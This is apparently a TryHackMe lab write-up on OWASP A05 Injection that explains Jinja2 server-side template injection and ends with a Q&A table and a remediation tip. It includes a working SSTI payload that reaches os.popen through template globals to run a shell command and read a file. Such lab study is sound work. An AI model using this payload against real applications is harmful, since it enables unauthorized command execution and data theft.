# OWASP Top 10 2025: Injection

{% embed url="https://tryhackme.com/room/owasptop102025insecuredatahandling" %}

Comprehensive breakdown of OWASP A05: Injection (2025 edition), focusing on Server-Side Template Injection (SSTI) in Python Jinja2 and achieving remote file disclosure.

---

## 1. What is Server-Side Template Injection (SSTI)?

SSTI occurs when user-supplied input is directly concatenated or evaluated inside a server-side templating engine (such as Jinja2, Twig, or FreeMarker) rather than passed safely as a data parameter.

When the template engine compiles the template, mathematical expressions like `{{7*7}}` or internal execution objects (`__class__`, `__mro__`, `__builtins__`) are executed server-side.

---

## 2. SSTI Exploitation Walkthrough

1. Locate the dynamic input field reflecting input into the page.
2. Confirm SSTI syntax:
   ```text
   {{7*7}}
   ```
   If the response renders `49`, template evaluation is active.
3. Traverse Python objects or read files directly from the application working directory:
   ```jinja2
   {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}
   ```
   Or via simpler configuration / standard file read wrappers provided by the lab.
4. The contents of `flag.txt` are rendered on the page:
   `flag{hidden}`

---

## 🏁 Questions & Answers

| Task | Question | Answer |
|---|---|---|
| **A05** | Vulnerability type demonstrated | Server-Side Template Injection (SSTI) |
| **A05** | Flag obtained by reading `flag.txt` | `flag{hidden}` |
| **Remediation** | Recommended defense | Never concatenate user input directly into `render_template_string()`; use standard parameterized template rendering |
